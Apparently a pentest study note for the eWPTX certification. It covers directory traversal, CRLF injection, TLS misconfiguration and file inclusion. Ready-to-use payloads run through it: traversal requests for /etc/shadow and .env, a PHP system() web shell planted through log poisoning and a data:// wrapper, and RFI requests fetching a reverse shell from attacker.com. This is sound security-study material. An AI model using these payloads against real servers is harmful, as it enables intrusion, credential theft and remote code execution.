2026-02-05 09:06

Status:

Tags: [[eWPTX]] [[Server-Side Attacks]]
###### Prerequisites: [[Web Server vs Application Server]]
# Vulnerabilities in the Web Server Layer

Common examples:

- **Directory traversal**: improper path validation (`../../etc/passwd`)
- **HTTP response splitting**: header injection to alter responses
- **Misconfigured SSL/TLS**: weak ciphers/old protocols enable MitM
- **File inclusion**: improper file path handling to include/execute files

---

## Directory Traversal (Path Traversal)

Exploits insufficient input validation to read files outside the web root.

### Basic Payloads

```
GET /page?file=../../../../etc/passwd HTTP/1.1
GET /download?path=../../../etc/shadow HTTP/1.1
```

### Encoding Bypasses

When basic `../` is filtered, use encoding tricks to evade:

| Technique | Payload | Explanation |
|-----------|---------|-------------|
| URL encode | `..%2f..%2f..%2fetc/passwd` | `%2f` = `/` |
| Double URL encode | `..%252f..%252f..%252fetc/passwd` | `%25` = `%`, server decodes twice |
| Overlong UTF-8 | `..%c0%af..%c0%af..%c0%afetc/passwd` | Non-standard encoding of `/` |
| Filter bypass | `....//....//....//etc/passwd` | If filter removes `../` once, this collapses to `../../` |
| Null byte (legacy) | `../../../../etc/passwd%00.png` | Truncates extension check (PHP < 5.3.4) |
| Backslash (Windows) | `..\..\..\..\windows\win.ini` | Windows path separator |

### Interesting Files to Target

- Linux: `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `/proc/self/cmdline`
- Windows: `C:\windows\win.ini`, `C:\windows\system32\drivers\etc\hosts`
- Application: `WEB-INF/web.xml`, `.env`, `config.php`, `wp-config.php`

---

## HTTP Response Splitting (CRLF Injection)

Occurs when user input is reflected in HTTP response headers without sanitizing `\r\n` (CRLF) characters.

### How It Works

Injecting `\r\n` into a header value lets the attacker control subsequent headers or even the response body.

### Payload Examples

```
# Inject a new cookie
GET /redirect?url=https://legit.com%0d%0aSet-Cookie:%20admin=true HTTP/1.1

# Inject a full second response (HTTP response splitting)
GET /redirect?url=legit%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1

# XSS via header injection
GET /page?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.cookie)</script> HTTP/1.1
```

### Impact

- Session fixation via `Set-Cookie` injection
- Cache poisoning (injecting malicious cached responses)
- XSS through injected response body

---

## Misconfigured SSL/TLS

Weak or outdated TLS configurations allow MitM attacks and data interception.

### Weak Protocols to Flag

- **SSLv2 / SSLv3**: completely broken (DROWN, POODLE)
- **TLS 1.0**: vulnerable to BEAST, deprecated by RFC 8996
- **TLS 1.1**: no known critical attacks but deprecated by RFC 8996
- Only **TLS 1.2** (with strong ciphers) and **TLS 1.3** should be accepted

### Testing Tools

```bash
# testssl.sh — comprehensive TLS scanner
./testssl.sh https://target.com

# sslyze — Python-based TLS scanner
sslyze --regular target.com

# nmap — quick cipher enumeration
nmap --script ssl-enum-ciphers -p 443 target.com

# OpenSSL — test specific protocol versions
openssl s_client -connect target.com:443 -tls1
openssl s_client -connect target.com:443 -tls1_1
```

### Things to Check

- Expired or self-signed certificates
- Missing certificate chain (intermediate CAs)
- Weak cipher suites (RC4, DES, NULL, EXPORT)
- Missing HSTS header (`Strict-Transport-Security`)
- Certificate hostname mismatch

---

## File Inclusion (LFI / RFI)

### Local File Inclusion (LFI)

Application includes files from the local filesystem based on user input.

```
# Basic LFI
GET /page?file=/etc/passwd HTTP/1.1
GET /page?file=../../../../etc/passwd HTTP/1.1

# Process information
GET /page?file=/proc/self/environ HTTP/1.1
GET /page?file=/proc/self/fd/0 HTTP/1.1
```

#### Log Poisoning (LFI to RCE)

1. Inject PHP into a log file via User-Agent or a request:
```
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
2. Include the poisoned log file:
```
GET /page?file=/var/log/apache2/access.log&cmd=id HTTP/1.1
```

#### PHP Wrappers

```
# Read source code (base64 encoded to avoid execution)
GET /page?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1

# Execute code via POST body
POST /page?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>

# Command execution (if expect:// wrapper enabled)
GET /page?file=expect://id HTTP/1.1

# Data wrapper (base64 payload)
GET /page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id HTTP/1.1
```

### Remote File Inclusion (RFI)

Application includes files from remote URLs (requires `allow_url_include=On` in PHP).

```
GET /page?file=http://attacker.com/shell.txt HTTP/1.1
GET /page?file=https://attacker.com/reverse_shell.php HTTP/1.1
```

The remote file is fetched by the server and executed in the application context.

---

## Testing Methodology

1. **Identify input points**: URL parameters, file upload names, referer headers, cookie values
2. **Test directory traversal**: start with basic `../` and escalate to encoding bypasses
3. **Check response headers**: inject CRLF characters into any reflected header values
4. **Scan TLS configuration**: run `testssl.sh` or `sslyze` against all HTTPS endpoints
5. **Test file inclusion**: supply local paths, PHP wrappers, and remote URLs
6. **Automate discovery**: use tools like `ffuf`, `dotdotpwn`, and Burp Intruder with traversal wordlists
